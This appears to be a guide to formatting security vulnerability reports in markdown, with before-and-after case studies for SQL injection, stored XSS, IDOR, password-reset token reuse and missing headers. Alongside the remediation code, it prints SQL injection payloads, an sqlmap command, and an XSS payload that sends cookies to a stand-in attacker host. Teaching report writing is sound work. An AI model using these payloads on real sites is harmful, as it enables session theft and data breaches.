# 32 - Advanced Formatting Techniques: Mastering Report Presentation

## Expert Role

You are a technical documentation specialist with deep expertise in creating visually compelling, information-dense security reports. You understand that formatting is not decoration—it is communication architecture. A well-formatted report guides the reader's eye to critical information, creates visual hierarchy that mirrors logical hierarchy, and makes complex technical content accessible to diverse audiences. You have mastered markdown, HTML, LaTeX, and document formatting tools, and you understand how different platforms render different formatting elements. Your reports are consistently praised for their clarity, professionalism, and visual appeal. You know that the same content, differently formatted, can have dramatically different impact on triagers, clients, and stakeholders.

## Core Concepts

### Formatting as Communication Architecture

Formatting is the visual structure that supports the logical structure of your report. Headers create hierarchy, code blocks signal technical content, tables organize comparisons, images provide evidence, and whitespace creates breathing room. Every formatting choice communicates something: a code block says "this is technical," a bold phrase says "this is important," a bullet list says "these are parallel items." Understanding this communication function transforms formatting from aesthetic choice to strategic tool.

### Markdown Mastery

Markdown is the lingua franca of security report formatting. Understanding its full capabilities—beyond basic bold and italic—is essential. Advanced markdown includes: nested lists, definition lists, task lists, footnotes, tables with alignment, code blocks with syntax highlighting, blockquotes for emphasis, and HTML embedding for elements markdown cannot express. Mastering markdown ensures your reports render correctly across platforms.

### Visual Hierarchy

Visual hierarchy guides the reader's attention through the report in the intended order. The most important information (vulnerability title, severity, impact) should be visually prominent. Supporting information (reproduction steps, evidence) should be clearly organized. Reference material (appendices, methodology) should be visually distinct. Hierarchy is created through: header levels, font size and weight, color, spacing, and positioning.

### Code Block Optimization

Code blocks are critical in security reports—they contain payloads, reproduction steps, and remediation code. Proper code block formatting includes: syntax highlighting for readability, line numbers for reference, proper indentation for clarity, and annotation for explanation. Understanding how different platforms render code blocks ensures your technical content is always readable.

### Table Design

Tables organize structured data: comparison data, severity matrices, parameter lists, and configuration changes. Good table design includes: clear headers, consistent alignment, appropriate column widths, and visual separation between rows. Advanced table techniques include: merged cells for grouping, color coding for status, and responsive design for different screen sizes.

### Image Integration

Images provide visual evidence: screenshots, diagrams, flowcharts, and architecture diagrams. Proper image integration includes: appropriate sizing, clear annotation, proper alt text for accessibility, and strategic placement near relevant text. Understanding image optimization ensures your evidence is clear without bloating the report.

### Whitespace and Breathing Room

Whitespace is not empty space—it is a formatting element that creates separation between sections, reduces cognitive load, and improves readability. Proper whitespace includes: paragraph spacing, section spacing, margin consistency, and line height. Overcrowded reports are hard to read; well-spaced reports invite reading.

### Responsive Formatting

Reports are read on different devices: desktop monitors, laptops, tablets, and phones. Responsive formatting ensures your report looks good on all devices. This includes: flexible table widths, responsive images, mobile-friendly code blocks, and appropriate font sizes for different screens.

### Platform-Specific Rendering

Different platforms render markdown differently. GitHub markdown, GitLab markdown, Confluence, Notion, and platform-specific editors all have quirks. Understanding these differences ensures your report renders correctly on the target platform. Always preview your report on the target platform before submission.

### Accessibility in Security Reports

Accessibility is often overlooked in security reports. Proper accessibility includes: descriptive alt text for images, proper heading hierarchy for screen readers, sufficient color contrast, and semantic markup. Accessible reports can be read by everyone, including stakeholders using assistive technologies.

### Diagram Integration

Diagrams communicate complex relationships: attack chains, architecture diagrams, data flows, and network topologies. Integrating diagrams effectively requires: choosing the right diagram type, proper sizing and placement, clear labeling, and appropriate detail level. Diagrams should enhance understanding, not overwhelm.

### Callouts and Admonitions

Callouts highlight important information: warnings, notes, tips, and critical alerts. They create visual emphasis that draws attention to key points. Different callout types serve different purposes: warnings about risks, notes about caveats, tips for implementation, and critical alerts about immediate action.

### Multi-Column Layouts

Some reports benefit from multi-column layouts: side-by-side comparisons, before/after examples, and parallel content. Multi-column layouts can be created with markdown tables, HTML columns, or document formatting tools. They should be used sparingly and only when they genuinely improve readability.

## Prerequisites

1. Proficiency in markdown syntax including advanced features
2. Understanding of HTML/CSS for custom formatting
3. Familiarity with document formatting tools (LaTeX, Word, Google Docs)
4. Knowledge of platform-specific markdown rendering differences
5. Understanding of visual design principles
6. Familiarity with image editing and annotation tools
7. Knowledge of diagram creation tools
8. Understanding of accessibility standards
9. Familiarity with responsive design principles
10. Knowledge of code block syntax highlighting
11. Understanding of typography principles
12. Familiarity with color theory and contrast
13. Knowledge of table design best practices
14. Understanding of whitespace and layout principles
15. Familiarity with document conversion tools
16. Knowledge of version control for documents
17. Understanding of print vs. digital formatting differences
18. Familiarity with brand and style guide compliance
19. Knowledge of automated formatting tools
20. Understanding of audience-specific formatting needs

## Methodology

### Step 1: Define Formatting Standards

Establish consistent formatting standards for all reports:

**Header Hierarchy**:
```
# Report Title (H1 - one per report)
## Section Headers (H2 - major sections)
### Subsection Headers (H3 - subsections)
#### Detail Headers (H4 - specific items)
##### Minor Headers (H5 - rarely used)
###### Sub-minor Headers (H6 - rarely used)
```

**Font and Weight Standards**:
- **Bold**: Critical findings, severity levels, key terms
- *Italic*: Emphasis, file names, variable names
- `Code`: Technical terms, parameters, values
- ~~Strikethrough~~: Deprecated or removed items

**Spacing Standards**:
- One blank line between paragraphs
- Two blank lines between major sections
- One blank line before and after code blocks
- One blank line before and after tables

### Step 2: Master Advanced Markdown

Learn and apply advanced markdown features:

**Tables**:
```markdown
| Column 1 | Column 2 | Column 3 |
|----------|----------|----------|
| Cell 1   | Cell 2   | Cell 3   |
| Cell 4   | Cell 5   | Cell 6   |
```

**Alignment**:
```markdown
| Left     | Center   | Right    |
|:---------|:--------:|---------:|
| Left     | Center   | Right    |
```

**Code Blocks with Syntax Highlighting**:
````
```python
def vulnerable_function(user_input):
    query = "SELECT * FROM users WHERE name = '" + user_input + "'"
    return db.execute(query)
```
````

**Nested Lists**:
```markdown
- Item 1
  - Sub-item 1.1
  - Sub-item 1.2
    - Sub-sub-item 1.2.1
- Item 2
  - Sub-item 2.1
```

**Task Lists**:
```markdown
- [x] Completed task
- [ ] Pending task
- [ ] Another pending task
```

**Footnotes**:
```markdown
This is a statement[^1] with a footnote.

[^1]: This is the footnote content.
```

**Blockquotes**:
```markdown
> This is a blockquote.
> It can span multiple lines.
>
> It can also contain multiple paragraphs.
```

### Step 3: Create Effective Tables

Design tables that organize information clearly:

**Vulnerability Summary Table**:
```markdown
| ID | Vulnerability | Severity | Status | CVSS |
|----|---------------|----------|--------|------|
| 1  | SQL Injection | Critical | Open   | 9.8  |
| 2  | XSS           | High     | Open   | 8.6  |
| 3  | IDOR          | Medium   | Fixed  | 6.5  |
```

**Comparison Table**:
```markdown
| Aspect        | Current State     | Recommended State  |
|---------------|-------------------|-------------------|
| Authentication| Basic auth        | OAuth 2.0 + MFA   |
| Authorization | Role-based        | Attribute-based    |
| Encryption    | TLS 1.0           | TLS 1.3            |
```

**Configuration Table**:
```markdown
| Setting               | Value       | Risk Level |
|-----------------------|-------------|------------|
| Debug mode            | enabled     | High       |
| CORS origin           | *           | High       |
| Session timeout       | 24 hours    | Medium     |
| Password policy       | 8 chars     | Medium     |
```

### Step 4: Optimize Code Blocks

Format code blocks for maximum readability:

**With Line Numbers**:
````
```python
1: def vulnerable_function(user_input):
2:     # Direct string concatenation - SQL Injection
3:     query = "SELECT * FROM users WHERE name = '" + user_input + "'"
4:     return db.execute(query)
```
````

**With Annotations**:
````
```python
def vulnerable_function(user_input):
    # VULNERABILITY: Direct string concatenation
    # FIX: Use parameterized query
    query = "SELECT * FROM users WHERE name = ?"  # Parameterized
    return db.execute(query, (user_input,))
```
````

**Before/After Comparison**:
````
**Before (Vulnerable)**:
```python
query = "SELECT * FROM users WHERE name = '" + user_input + "'"
```

**After (Fixed)**:
```python
query = "SELECT * FROM users WHERE name = %s"
cursor.execute(query, (user_input,))
```
````

### Step 5: Integrate Images Effectively

Place and annotate images for maximum impact:

**Screenshot with Annotation**:
```markdown
![SQL Injection in Burp Suite showing the vulnerable parameter highlighted in red](images/sqli-burp.png)
*Figure 1: SQL injection vulnerability in Burp Suite. The vulnerable parameter is highlighted in red.*
```

**Before/After Images**:
```markdown
![Before fix: SQL injection returns all users](images/before-fix.png)
*Figure 2: Before fix - SQL injection returns all user data.*

![After fix: Input validation rejects malicious payload](images/after-fix.png)
*Figure 3: After fix - Input validation rejects malicious payload.*
```

**Diagram Integration**:
```markdown
![Attack chain diagram showing the exploitation path](images/attack-chain.png)
*Figure 4: Attack chain showing the path from initial access to data exfiltration.*
```

### Step 6: Create Effective Diagrams

Design diagrams that communicate clearly:

**Attack Chain Diagram**:
```markdown
```mermaid
graph LR
    A[Attacker] -->|Crafts malicious request| B[Web Application]
    B -->|Processes input| C[Database]
    C -->|Returns data| B
    B -->|Returns data| A
    A -->|Extracts sensitive data| D[Data Exfiltration]
```
````

**Architecture Diagram**:
```markdown
```mermaid
graph TB
    A[Client] -->|HTTPS| B[Load Balancer]
    B -->|HTTP| C[Web Server 1]
    B -->|HTTP| D[Web Server 2]
    C -->|SQL| E[Database]
    D -->|SQL| E
    E -->|Backup| F[Backup Server]
```
````

**Data Flow Diagram**:
```markdown
```mermaid
sequenceDiagram
    participant U as User
    participant W as Web App
    participant D as Database
    U->>W: Login Request
    W->>D: Query User
    D->>W: User Data
    W->>U: Session Token
```
````

### Step 7: Use Callouts and Admonitions

Highlight important information with callouts:

**Warning Callout**:
```markdown
> **Warning**: This vulnerability is actively being exploited in the wild. Immediate remediation is recommended.
```

**Note Callout**:
```markdown
> **Note**: This vulnerability requires authentication to exploit.
```

**Tip Callout**:
```markdown
> **Tip**: Use parameterized queries to prevent SQL injection vulnerabilities.
```

**Critical Callout**:
```markdown
> **Critical**: This vulnerability allows remote code execution with root privileges.
```

### Step 8: Design Effective Layouts

Create layouts that guide the reader:

**Executive Summary Layout**:
```markdown
## Executive Summary

### Key Findings
- **Critical**: 2 vulnerabilities
- **High**: 3 vulnerabilities
- **Medium**: 5 vulnerabilities
- **Low**: 3 vulnerabilities

### Risk Assessment
| Category | Rating | Justification |
|----------|--------|---------------|
| Overall  | High   | Multiple critical vulnerabilities identified |
| Data     | Critical | SQL injection exposes all user data |
| Auth     | High   | Authentication bypass allows account takeover |
```

**Finding Layout**:
```markdown
## Finding: SQL Injection in User Search

### Summary
| Field | Value |
|-------|-------|
| Severity | Critical (CVSS 9.8) |
| Endpoint | `/api/users/search` |
| Parameter | `name` |
| Authentication | Required |

### Description
[Detailed description]

### Impact
[Impact assessment]

### Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Evidence
[Screenshots and request/response]

### Remediation
[Remediation guidance]
```

### Step 9: Apply Responsive Design

Ensure reports look good on all devices:

**Flexible Tables**:
```markdown
<div style="overflow-x:auto">

| Column 1 | Column 2 | Column 3 | Column 4 | Column 5 |
|----------|----------|----------|----------|----------|
| Cell 1   | Cell 2   | Cell 3   | Cell 4   | Cell 5   |

</div>
```

**Responsive Images**:
```markdown
![Description](image.png)
*Figure 1: Description. Click to enlarge.*
```

**Mobile-Friendly Code Blocks**:
````
```
Long code lines wrap properly on mobile devices
```
````

### Step 10: Preview and Test

Preview reports on the target platform:

**GitHub Preview**:
```bash
# Preview markdown in browser
grip report.md
```

**Platform-Specific Preview**:
- Bugcrowd: Use the platform's preview editor
- HackerOne: Use the platform's markdown preview
- Custom: Use markdown preview tools

**Cross-Platform Testing**:
- Test on desktop browser
- Test on mobile browser
- Test in different markdown renderers
- Test print version

## Tool Arsenal

### Markdown Editors

- **Visual Studio Code**: Full-featured editor with markdown preview
- **Typora**: WYSIWYG markdown editor
- **Mark Text**: Open source WYSIWYG markdown editor
- **Zettlr**: Markdown editor for academic writing
- **iA Writer**: Minimal markdown editor
- **Bear**: Note-taking app with markdown support
- **Notion**: Collaborative workspace with markdown
- **HackMD**: Collaborative markdown editor

### Markdown Preview Tools

- **Grip**: GitHub README Instant Preview
- **Markdown Preview Plus**: Atom package for markdown preview
- **Markdown Preview Enhanced**: VS Code extension
- **Live Server**: VS Code extension with live reload
- **Browser extensions**: Markdown preview in browser
- **Command-line tools**: `cmark`, `pandoc`
- **Online editors**: StackEdit, Dillinger, Markdownditor
- **Platform preview**: Bugcrowd, HackerOne preview editors

### Diagram Creation Tools

- **Mermaid**: JavaScript-based diagramming
- **PlantUML**: UML diagram generation
- **Draw.io**: Online diagramming tool
- **Lucidchart**: Professional diagramming platform
- **Visio**: Microsoft diagramming tool
- **Graphviz**: Graph visualization software
- **yUML**: Simple UML diagram generation
- **D3.js**: Data-driven document visualization

### Image Editing and Annotation Tools

- **Snagit**: Professional screenshot capture and annotation
- **Greenshot**: Open source screenshot tool
- **ShareX**: Screen capture and sharing tool
- **LightShot**: Quick screenshot capture tool
- **Skitch**: Simple annotation tool
- **PicPick**: Screen capture with design tools
- **GIMP**: Open source image editor
- **Photoshop**: Professional image editor

### Code Block Tools

- **Prism.js**: Syntax highlighting library
- **Highlight.js**: Syntax highlighting library
- **Pygments**: Syntax highlighter for many languages
- **rouge**: Syntax highlighter for Ruby
- **Shiki**: Syntax highlighter with VS Code themes
- **Carbon**: Create beautiful code screenshots
- **ray.so**: Code image generator
- **codeimg.io**: Code to image converter

### Table Creation Tools

- **TablesGenerator.com**: Online table generator
- **Markdown Tables**: Generate markdown tables
- **CSV to Markdown**: Convert CSV to markdown tables
- **Excel to Markdown**: Convert Excel to markdown tables
- **SQL to Markdown**: Convert SQL results to tables
- **JSON to Markdown**: Convert JSON to tables
- **YAML to Markdown**: Convert YAML to tables
- **Custom scripts**: Python, JavaScript table generators

### Formatting Automation Tools

- **Prettier**: Code formatter with markdown support
- **markdownlint**: Markdown linting and formatting
- **mdformat**: Markdown formatter
- **remark**: Markdown processor
- **unified**: Interface for processing content
- **rehype**: HTML processor
- **rehype-raw**: Parse HTML in markdown
- **remark-gfm**: GitHub Flavored Markdown

### Document Conversion Tools

- **Pandoc**: Universal document converter
- **Calibre**: E-book management with conversion
- **LibreOffice**: Office suite with export capabilities
- **Google Docs**: Online document editor
- **Microsoft Word**: Document editor
- **LaTeX**: Professional typesetting system
- **AsciiDoc**: Lightweight markup language
- **reStructuredText**: Markup language for documentation

### Automated Formatting Scripts

```bash
# Format markdown table
cat table.csv | python -c "import sys, csv; reader = csv.reader(sys.stdin); rows = list(reader); header = rows[0]; print('| ' + ' | '.join(header) + ' |'); print('|' + '|'.join(['---' for _ in header]) + '|'); [print('| ' + ' | '.join(row) + ' |') for row in rows[1:]]"

# Generate mermaid diagram
cat diagram.mmd | mmdc -i /dev/stdin -o diagram.png

# Convert markdown to HTML
pandoc -f markdown -t html report.md -o report.html

# Preview markdown in browser
grip report.md

# Lint markdown
markdownlint report.md

# Format markdown
mdformat report.md

# Convert markdown to PDF
pandoc report.md -o report.pdf --pdf-engine=xelatex

# Generate table of contents
grep -n '^#' report.md | awk -F: '{print $1 ": " $2}' > toc.txt
```

## Case Studies

### Case Study 1: SQL Injection Report Formatting

**Before (Poor Formatting)**:
```markdown
# SQL Injection

There is SQL injection in the search. The parameter name is vulnerable.

Impact: Attacker can get all data.

Steps:
1. Go to search
2. Enter ' OR 1=1 --
3. See all users

Fix: Use parameterized queries.
```

**After (Advanced Formatting)**:
```markdown
# SQL Injection in User Search Functionality

## Summary

| Field | Value |
|-------|-------|
| Severity | **Critical** (CVSS 9.8) |
| Endpoint | `GET /api/users/search` |
| Parameter | `name` |
| Authentication | Required |

## Description

A **SQL injection** vulnerability exists in the user search functionality. The `name` parameter is vulnerable to **boolean-based blind SQL injection**. An attacker can extract arbitrary data from the database by sending crafted requests that evaluate to true or false conditions.

## Impact

| Impact Type | Description |
|-------------|-------------|
| **Confidentiality** | Full database access, including user credentials |
| **Integrity** | Arbitrary data modification possible |
| **Availability** | Database denial of service possible |

**Business Impact**: An attacker can extract all user data (500,000 records including emails, password hashes, and payment information). This constitutes a **data breach** requiring notification under GDPR Article 33.

## Reproduction Steps

### Prerequisites
- Authenticated user account
- Burp Suite or similar proxy tool

### Steps

1. **Log in** to the application as a regular user
2. **Navigate** to the user search page: `https://example.com/users/search`
3. **Intercept** the search request in Burp Suite
4. **Send** the request to Burp Repeater
5. **Modify** the `name` parameter with the following payload:

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1
```

6. **Observe** that the application returns normal search results
7. **Modify** the `name` parameter with the following payload:

```sql
' AND (SELECT CASE WHEN (1=0) THEN 1 ELSE 0 END)='1
```

8. **Observe** that the application returns no results
9. **Confirm** boolean-based blind SQL injection

### Evidence

![Burp Suite showing SQL injection payloads and responses](images/sqli-burp.png)
*Figure 1: SQL injection in Burp Suite. The true condition returns results, the false condition returns empty.*

```http
GET /api/users/search?name=' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1 HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

```json
{
  "users": [
    {"id": 1, "name": "John Doe", "email": "john@example.com"},
    {"id": 2, "name": "Jane Smith", "email": "jane@example.com"}
  ]
}
```

## Remediation

### Immediate Fix

Replace string concatenation with parameterized queries:

**Before (Vulnerable)**:
```python
def search_users(request):
    query = "SELECT * FROM users WHERE name LIKE '%" + request.GET['name'] + "%'"
    cursor.execute(query)
    return render(request, 'users.html', {'users': cursor.fetchall()})
```

**After (Fixed)**:
```python
def search_users(request):
    search_term = request.GET.get('name', '')
    if not search_term or len(search_term) > 100:
        return HttpResponseBadRequest("Invalid search term")
    
    query = "SELECT * FROM users WHERE name LIKE %s"
    cursor.execute(query, ['%' + search_term + '%'])
    return render(request, 'users.html', {'users': cursor.fetchall()})
```

### Additional Recommendations

1. **Input Validation**: Add allowlist validation for search parameters
2. **WAF Rules**: Deploy SQL injection detection rules
3. **Monitoring**: Implement SQL injection detection and alerting
4. **Testing**: Add SQL injection test cases to CI/CD pipeline

## Verification

Run the following verification steps:

```bash
# Test injection payload
curl -X GET "https://example.com/api/users/search?name=' OR 1=1 --" \
  -H "Authorization: Bearer $TOKEN"
# Expected: 400 Bad Request or sanitized output

# Run automated SQL injection test
sqlmap -u "https://example.com/api/users/search?name=test" --batch
# Expected: No vulnerabilities found
```
```

### Result
This formatted report is clear, professional, and provides all necessary information for triagers and developers to understand, reproduce, and fix the vulnerability.

### Case Study 2: XSS Report Formatting

**Before (Poor Formatting)**:
```markdown
# XSS

There is XSS in comments. Users can put script tags.

Impact: Can steal cookies.

Fix: Sanitize input.
```

**After (Advanced Formatting)**:
```markdown
# Stored Cross-Site Scripting (XSS) in Comment Section

## Severity

**High** (CVSS 8.6)

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | Required |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | None |

## Summary

A **stored XSS** vulnerability exists in the comment section. User-supplied comment text is stored in the database without output encoding and rendered in other users' browsers without sanitization.

## Impact

| Affected Users | Impact |
|----------------|--------|
| All users viewing comments | Session hijacking |
| Admin users viewing comments | Account takeover |
| Users clicking malicious links | Credential theft |

**Business Impact**: An attacker can inject malicious JavaScript that executes in the context of other users' sessions, enabling:
- Session token theft
- Credential harvesting
- Arbitrary actions on behalf of users
- Data exfiltration

## Reproduction Steps

### Step 1: Create a Test Account

```
URL: https://example.com/register
Username: testuser@test.com
Password: TestPassword123!
```

### Step 2: Navigate to Comments

```
URL: https://example.com/articles/1/comments
```

### Step 3: Submit Malicious Comment

```
Comment Text: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

### Step 4: View the Comment

Log out and view the article as another user. Observe the script execution.

### Evidence

![XSS payload executing in browser](images/xss-execution.png)
*Figure 1: XSS payload executing in the browser console.*

![Stolen cookie sent to attacker server](images/xss-cookie.png)
*Figure 2: Stolen session cookie sent to attacker-controlled server.*

```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

## Remediation

### Output Encoding

Implement context-aware output encoding:

```python
from markupsafe import escape

def display_comment(comment):
    # HTML context - escape HTML entities
    safe_comment = escape(comment.text)
    return f'<div class="comment">{safe_comment}</div>'
```

### Content Security Policy

Add CSP header to prevent script execution:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';" always;
```

### Input Validation

Add allowlist validation for comment content:

```python
import re

def validate_comment(comment):
    # Remove HTML tags
    clean = re.sub(r'<[^>]+>', '', comment)
    # Limit length
    if len(clean) > 1000:
        raise ValueError("Comment too long")
    return clean
```

## Verification

```bash
# Test XSS payload
curl -X POST "https://example.com/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"text": "<script>alert(1)</script>"}'
# Expected: Payload rejected or escaped

# Check CSP header
curl -I "https://example.com/" | grep Content-Security-Policy
# Expected: CSP header present
```
```

### Case Study 3: IDOR Report Formatting

**Before (Poor Formatting)**:
```markdown
# IDOR

Users can see other users' documents.

Fix: Add authorization.
```

**After (Advanced Formatting)**:
```markdown
# Insecure Direct Object Reference (IDOR) in Document Access

## Summary

| Field | Value |
|-------|-------|
| Severity | **High** (CVSS 7.5) |
| Endpoint | `GET /api/documents/{id}/download` |
| Parameter | `id` |
| Authentication | Required |

## Description

An **Insecure Direct Object Reference (IDOR)** vulnerability exists in the document download endpoint. By modifying the `id` parameter in the download request, any authenticated user can access any document in the system, regardless of ownership.

## Impact Matrix

| User Role | Can Access | Data Exposed |
|-----------|------------|--------------|
| Regular User | All documents | All user data |
| Admin | All documents | All system data |
| Attacker | All documents | Complete data breach |

**Business Impact**: Testing demonstrated access to documents belonging to different users by incrementing the document ID. Document types exposed include:
- Personal identification documents
- Financial records
- Medical records
- Confidential business documents

## Reproduction Steps

### Setup

1. Create two test accounts:
   - **User A**: usera@test.com / Password123!
   - **User B**: userb@test.com / Password123!

2. Upload a document as User A:
   ```
   URL: https://example.com/documents/upload
   File: test-document.pdf
   ```

### Test

1. **Log in** as User A
2. **Navigate** to your documents: `https://example.com/documents`
3. **Note** the document ID (e.g., `1001`)
4. **Log out**
5. **Log in** as User B
6. **Navigate** to the document: `https://example.com/documents/1001/download`
7. **Observe** that User B can download User A's document

### Evidence

![User A's document list](images/usera-docs.png)
*Figure 1: User A's document list showing document ID 1001.*

![User B accessing User A's document](images/userb-access.png)
*Figure 2: User B successfully downloading User A's document.*

```http
GET /api/documents/1001/download HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

```http
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="test-document.pdf"
```

## Remediation

### Authorization Check

Add ownership verification to the download endpoint:

```python
from django.contrib.auth.decorators import login_required
from django.http import HttpResponseForbidden

@login_required
def download_document(request, doc_id):
    try:
        document = Document.objects.get(id=doc_id)
    except Document.DoesNotExist:
        return HttpResponseNotFound("Document not found")
    
    # Authorization check
    if document.owner_id != request.user.id and not request.user.is_staff:
        return HttpResponseForbidden("Access denied")
    
    return FileResponse(document.file, as_attachment=True)
```

### Rate Limiting

Add rate limiting to prevent enumeration:

```python
from django_ratelimit.decorators import ratelimit

@login_required
@ratelimit(key='user', rate='100/h', method='GET')
def download_document(request, doc_id):
    was_limited = getattr(request, 'limited', False)
    if was_limited:
        return JsonResponse({'error': 'Rate limit exceeded'}, status=429)
    
    # Authorization check
    # ...
```

### Audit Logging

Add audit logging for document access:

```python
import logging

logger = logging.getLogger('document_access')

@login_required
def download_document(request, doc_id):
    document = Document.objects.get(id=doc_id)
    
    # Log access
    logger.info(f"User {request.user.id} accessed document {doc_id}")
    
    # Authorization check
    # ...
```

## Verification

```bash
# Test IDOR
curl -X GET "https://example.com/api/documents/1001/download" \
  -H "Authorization: Bearer $OTHER_USER_TOKEN"
# Expected: 403 Forbidden

# Run automated IDOR test
# Use Burp Suite Intruder to test document ID range
```
```

### Case Study 4: Authentication Bypass Formatting

**Before (Poor Formatting)**:
```markdown
# Auth Bypass

Can reset password multiple times.

Fix: Invalidate tokens.
```

**After (Advanced Formatting)**:
```markdown
# Password Reset Token Reuse Vulnerability

## Executive Summary

A **critical** authentication vulnerability allows password reset tokens to be reused multiple times. An attacker who obtains a valid reset token can reset the password repeatedly, maintaining access to the account even after the legitimate user resets their password.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Severity | **Critical** (CVSS 9.1) |
| Endpoint | `POST /api/reset-password` |
| Parameter | `token` |
| Authentication | Not Required |

## Technical Analysis

The application generates password reset tokens but fails to invalidate them after use. Additionally, tokens do not have an expiration time, making them valid indefinitely.

### Token Lifecycle Analysis

```
Token Generation → Token Storage → Token Validation → Password Reset → [MISSING: Token Invalidation]
```

### Attack Scenario

```mermaid
sequenceDiagram
    participant A as Attacker
    participant V as Victim
    participant S as Server
    
    A->>S: Request password reset for victim@email.com
    S->>V: Send reset token via email
    A->>S: Intercept token (via email access)
    A->>S: Reset password with token
    S->>A: Password reset successful
    A->>S: Reset password again with same token
    S->>A: Password reset successful (VULNERABILITY)
    V->>S: Reset password (legitimate)
    S->>V: Password reset successful
    A->>S: Reset password again with same token
    S->>A: Password reset successful (VULNERABILITY)
```

## Impact Assessment

| Impact | Description |
|--------|-------------|
| **Account Takeover** | Attacker maintains access after legitimate password reset |
| **Persistent Access** | Token reuse allows indefinite account access |
| **Session Hijacking** | Attacker can reset password from any session |
| **Data Breach** | Full account compromise exposes all user data |

**Financial Impact**: Average cost of account takeover: $150-300 per incident. For 10,000 affected users: $1.5M-3M potential exposure.

## Reproduction Steps

### Step 1: Generate Reset Token

```http
POST /api/forgot-password HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "email": "victim@example.com"
}
```

Response:
```json
{
  "message": "Password reset email sent"
}
```

### Step 2: Obtain Token

Access the reset token from:
- Email interception
- Token prediction
- Database access

### Step 3: Reset Password (First Use)

```http
POST /api/reset-password HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "abc123def456",
  "password": "NewPassword123!"
}
```

Response:
```json
{
  "message": "Password reset successful"
}
```

### Step 4: Reset Password (Second Use - VULNERABILITY)

```http
POST /api/reset-password HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "abc123def456",
  "password": "AnotherPassword456!"
}
```

Response:
```json
{
  "message": "Password reset successful"
}
```

### Evidence

![Token reuse in Burp Repeater](images/token-reuse.png)
*Figure 1: Burp Repeater showing successful token reuse.*

![Database showing non-invalidated token](images/token-db.png)
*Figure 2: Database record showing token still valid after use.*

## Remediation

### Token Invalidation

Invalidate token after successful use:

```python
from django.utils import timezone

def reset_password(request, token):
    try:
        user = User.objects.get(
            reset_token=token,
            reset_token_expires__gt=timezone.now()
        )
    except User.DoesNotExist:
        return HttpResponseBadRequest("Invalid or expired token")
    
    # Set new password
    user.set_password(request.POST['password'])
    
    # Invalidate token
    user.reset_token = None
    user.reset_token_expires = None
    user.save()
    
    # Invalidate all sessions
    user.session_set.delete()
    
    return redirect('/login/')
```

### Token Expiration

Add token expiration (24 hours):

```python
from datetime import timedelta

def generate_reset_token(user):
    token = secrets.token_urlsafe(32)
    user.reset_token = token
    user.reset_token_expires = timezone.now() + timedelta(hours=24)
    user.save()
    return token
```

### Rate Limiting

Add rate limiting on reset endpoint:

```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/h', method='POST')
def forgot_password(request):
    was_limited = getattr(request, 'limited', False)
    if was_limited:
        return JsonResponse({'error': 'Rate limit exceeded'}, status=429)
    
    # Process request
    # ...
```

## Verification

```bash
# Test token reuse
curl -X POST "https://example.com/api/reset-password" \
  -d '{"token": "abc123", "password": "newpass1"}'
# Expected: Success

curl -X POST "https://example.com/api/reset-password" \
  -d '{"token": "abc123", "password": "newpass2"}'
# Expected: 400 Bad Request

# Test token expiration
# Wait 24 hours and test same token
# Expected: 400 Bad Request
```
```

### Case Study 5: Configuration Vulnerability Formatting

**Before (Poor Formatting)**:
```markdown
# Missing Headers

Security headers are missing.

Fix: Add headers.
```

**After (Advanced Formatting)**:
```markdown
# Missing Security Headers

## Executive Summary

The application is missing critical security headers that protect users from common web attacks. This includes headers that prevent clickjacking, MIME-sniffing, downgrade attacks, and cross-site scripting.

## Missing Headers Analysis

| Header | Status | Risk | Impact |
|--------|--------|------|--------|
| X-Content-Type-Options | Missing | High | MIME-sniffing attacks |
| X-Frame-Options | Missing | High | Clickjacking attacks |
| Strict-Transport-Security | Missing | High | Protocol downgrade attacks |
| Content-Security-Policy | Missing | High | Cross-site scripting |
| Referrer-Policy | Missing | Medium | Information leakage |
| Permissions-Policy | Missing | Low | Feature abuse |

## SecurityHeaders.com Scan Results

![SecurityHeaders.com scan showing F rating](images/securityheaders-scan.png)
*Figure 1: SecurityHeaders.com scan results showing F rating due to missing headers.*

**Overall Rating**: F (0/100)
**Grade**: F
**Recommendations**: 6 missing headers

## Impact Assessment

### Clickjacking (X-Frame-Options)

Without `X-Frame-Options`, the application can be embedded in iframes on attacker-controlled sites. This enables:
- Clickjacking attacks
- Credential theft via invisible frames
- UI redress attacks

### MIME-Sniffing (X-Content-Type-Options)

Without `X-Content-Type-Options`, browsers may interpret files as different types, enabling:
- XSS via file upload
- Drive-by downloads
- Content type confusion attacks

### Protocol Downgrade (HSTS)

Without `Strict-Transport-Security`, users are vulnerable to:
- SSL stripping attacks
- Man-in-the-middle attacks
- Cookie theft via HTTP

### XSS (CSP)

Without `Content-Security-Policy`, the application lacks defense-in-depth against:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Data injection attacks

## Remediation

### nginx Configuration

Add the following to `nginx.conf`:

```nginx
server {
    listen 443 ssl;
    server_name example.com;
    
    # Security Headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
    
    # HSTS with preload
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    
    # Content Security Policy
